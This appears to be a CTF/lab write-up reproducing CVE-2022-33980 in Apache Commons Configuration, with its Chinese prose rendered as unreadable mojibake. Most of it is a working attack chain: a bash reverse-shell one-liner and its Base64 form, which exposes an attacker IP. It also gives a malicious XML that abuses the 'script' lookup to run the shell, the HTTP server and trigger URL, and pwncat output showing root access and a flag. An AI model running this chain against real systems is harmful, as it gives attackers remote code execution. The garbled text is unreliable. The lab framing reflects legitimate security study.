# CVE-2022-33980

:::info

Tags

- Apache Commons Configuration è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´

å®˜æ–¹æ•°æ®åº“è®°å½•

> Apache Commons Configuration æ‰§è¡Œå˜é‡æ’å€¼ï¼Œå…è®¸åŠ¨æ€è¯„ä¼°å’Œæ‰©å±•å±æ€§ã€‚
>
> æ’å€¼çš„æ ‡å‡†æ ¼å¼æ˜¯ â€œ$\{prefix:name\}â€ï¼Œå…¶ä¸­ â€œprefixâ€ ç”¨äºå®šä½æ‰§è¡Œæ’å€¼çš„ org.apache.commons.configuration2.interpol.Lookup å®ä¾‹ã€‚
>
> ä»ç‰ˆæœ¬ 2.4 å¼€å§‹ä¸€ç›´åˆ° 2.7ï¼Œé»˜è®¤ Lookup å®ä¾‹é›†åŒ…å«å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œæˆ–ä¸è¿œç¨‹æœåŠ¡å™¨è”ç³»çš„æ’å€¼å™¨ã€‚
>
> è¿™äº›æŸ¥æ‰¾æ˜¯ï¼š
>
> - â€œscriptâ€ - ä½¿ç”¨ JVM è„šæœ¬æ‰§è¡Œå¼•æ“ (javax.script) æ‰§è¡Œè¡¨è¾¾å¼
> - â€œdnsâ€ - è§£æ dns è®°å½•
> - â€œurlâ€ - ä» url åŠ è½½å€¼ï¼ŒåŒ…æ‹¬ä»è¿œç¨‹æœåŠ¡å™¨
>
> ä½¿ç”¨æ’å€¼é»˜è®¤å€¼çš„åº”ç”¨ç¨‹åºå¦‚æœä½¿ç”¨ä¸å—ä¿¡ä»»çš„é…ç½®å€¼ï¼Œå—å½±å“çš„ç‰ˆæœ¬å¯èƒ½å®¹æ˜“å—åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–æ— æ„ä¸­ä¸è¿œç¨‹æœåŠ¡å™¨çš„è”ç³»ã€‚
>
> å»ºè®®ç”¨æˆ·å‡çº§åˆ° Apache Commons Configuration 2.8.0ï¼Œè¯¥ç‰ˆæœ¬é»˜è®¤ç¦ç”¨æœ‰é—®é¢˜çš„æ’å€¼å™¨ã€‚

:::

å‚è€ƒ [ä¸€äº› cve çš„å¤ç° - å°é»‘çš„ç¬”è®°](https://www.supersmallblack.cn/CVE%E5%A4%8D%E7%8E%B0.html)

åŸå§‹çš„æ¶æ„æŒ‡ä»¤ä¸º

```plaintext
/bin/sh -i >& /dev/tcp/139.*.*.*/9999 0>&1
```

ç»è¿‡ Base64 ç¼–ç åå¾—åˆ°

```plaintext
L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMzkuOS40LjU2Lzk5OTkgMD4mMQ==
```

åœ¨ vps ä¸Šæ„é€ æ¶æ„ xml

```xml
<?xml version="1.0" encoding="ISO-8859-1" ?>
<configuration>
        <path>${script:js:java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMzkuOS40LjU2Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")}</path>
</configuration>
```

å¯åŠ¨ä¸´æ—¶ http æœåŠ¡å™¨

```plaintext
root@jmt-projekt:~# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

ç„¶åè®¿é—®æœåŠ¡

```plaintext
http://eci-2ze440yv0x20kqyxglfa.cloudeci1.ichunqiu.com/Url?url=http://139.*.*.*:8080/CVE-2022-33980.xml&data=path
```

å³å¯æ”¶åˆ°åè¿çš„ shell

```bash
root@jmt-projekt:~# pwncat-cs -lp 9999
[17:18:30] Welcome to pwncat ğŸˆ!
[17:21:09] received connection from 39.106.20.178:29507
[17:21:10] 0.0.0.0:9999: upgrading from /bin/dash to /bin/bash
[17:21:11] 39.106.20.178:29507: registered new host w/ db
(local) pwncat$ back
(remote) root@engine-2:/opt/app# cat /flag
flag{296b02e5-4fda-4031-a89f-ce813b77af1b}
```
